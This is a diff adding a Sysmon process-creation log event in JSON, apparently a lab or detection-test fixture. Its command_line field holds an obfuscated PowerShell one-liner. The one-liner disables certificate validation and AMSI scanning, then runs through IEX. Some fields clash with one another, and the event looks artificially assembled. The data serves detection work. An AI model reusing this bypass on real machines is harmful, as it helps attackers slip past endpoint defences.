@@ -1,0 +1,134 @@
+{
+  "@timestamp": "2021-02-05T05:02:00.131Z",
+  "process": {
+    "entity_id": "{19FC45AC-D148-601C-0000-00104FD54700}",
+    "pid": 556,
+    "executable": "C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
+    "working_directory": "C:\\Windows\\system32\\",
+    "parent": {
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ],
+      "entity_id": "{19FC45AC-768F-601C-0000-0010EE630000}",
+      "pid": 440,
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe"
+    },
+    "command_line": "powershell.exe  -exec bypass -noni -nop -w 1 -C \"-jOin( '91}78The exclusive semaphore is owned by another process.%%116%%46>83~101m114X118>105_99~101>80&111>105X110X116~77&97X110Z97~103&101X114>93X58~58X83>101_114~118&101m114_67X101m114Z116m105~102&105m99Z97m116}101Z86X97~108~105%%100%%97}116_105%%111}110%%67m97X108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114Z121m123~10_91Z82}101}102m93}46&65~115&115Z101>109m98Z108_121Z46~71>101X116Z84}121_112m101%%40%%39%%83_121&115_39X43}39~116>101X109_46X77Z97Z110}39>43_39Z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116Z105Z111X110X46m65}109X39&43~39_115>105~85m116~39Z43X39~105X108Z115Z39_41&46%%71~101}116~70~105~101X108%%100}40Z39~97&109>39X43>39~115m105X73X110X105>39Z43}39&116_70_97}105}108Z101m100X39&44m32}39&78%%111~110&80&39&43X39X117X98%%108~105~99_44~83_116m97Z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108Z44_32&36Z116}114&117X101&41Z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115X105&111>110X84&97&98}108Z101'.spliT( '~_X}%%~mZ>&' )| foReAch{ ( [inT]$_ -aS[chAR]) }) |& ( $psHomE[4]+$PShoME[30]+'X')\" ",
+    "name": "FlashPlayerUpdateService.exe",
+    "args": [
+      "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe"
+    ],
+    "hash": {
+      "md5": "1234a12b71dae034e45c714ae5a54412",
+      "sha256": "079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d"
+    }
+  },
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "SYSTEM"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "log": {
+    "level": "information"
+  },
+  "winlog": {
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "process": {
+      "pid": 1928,
+      "thread": {
+        "id": 1716
+      }
+    },
+    "computer_name": "CLIENT1.breach.local",
+    "opcode": "Info",
+    "version": 5,
+    "api": "wineventlog",
+    "event_id": 1,
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "record_id": 1523,
+    "task": "Process Create (rule: ProcessCreate)",
+    "user": {
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY",
+      "type": "User"
+    },
+    "event_data": {
+      "OriginalFileName": "?",
+      "FileVersion": "18,0,0,194",
+      "LogonId": "0x3e7",
+      "Company": "Adobe Systems Incorporated",
+      "TerminalSessionId": "0",
+      "Product": "Adobe\u00ae Flash\u00ae Player Update Service",
+      "LogonGuid": "{19FC45AC-768F-601C-0000-0020E7030000}",
+      "IntegrityLevel": "System",
+      "Description": "Adobe\u00ae Flash\u00ae Player Update Service 18.0 r0"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  "event": {
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-05T05:02:01.540Z",
+    "module": "sysmon",
+    "category": [
+      "process"
+    ]
+  },
+  "hash": {
+    "md5": "1234a12b71dae034e45c714ae5a54412",
+    "sha256": "079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d"
+  },
+  "agent": {
+    "version": "7.10.2",
+    "hostname": "CLIENT1",
+    "ephemeral_id": "486f7872-9118-4349-8630-511973cdbf72",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT1",
+    "type": "winlogbeat"
+  },
+  "host": {
+    "hostname": "CLIENT1",
+    "architecture": "x86",
+    "os": {
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "name": "CLIENT1.breach.local",
+    "ip": [
+      "192.168.56.101",
+      "172.16.1.1",
+      "fe80::5efe:c0a8:3865",
+      "fe80::5efe:ac10:101"
+    ],
+    "mac": [
+      "00:50:56:00:03:01",
+      "00:50:56:00:00:01",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ]
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-05 05:02:00.131\nProcessGuid: {19FC45AC-D148-601C-0000-00104FD54700}\nProcessId: 556\nImage: C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe\nFileVersion: 18,0,0,194\nDescription: Adobe\u00ae Flash\u00ae Player Update Service 18.0 r0\nProduct: Adobe\u00ae Flash\u00ae Player Update Service\nCompany: Adobe Systems Incorporated\nOriginalFileName: ?\nCommandLine: C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=1234A12B71DAE034E45C714AE5A54412,SHA256=079E6BC834F38322ED5ED76295EC3961ED894084EF5CB171DFFBD9B3822CC78D\nParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "related": {
+    "user": "SYSTEM",
+    "hash": [
+      "1234a12b71dae034e45c714ae5a54412",
+      "079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d"
+    ]
+  }
+}
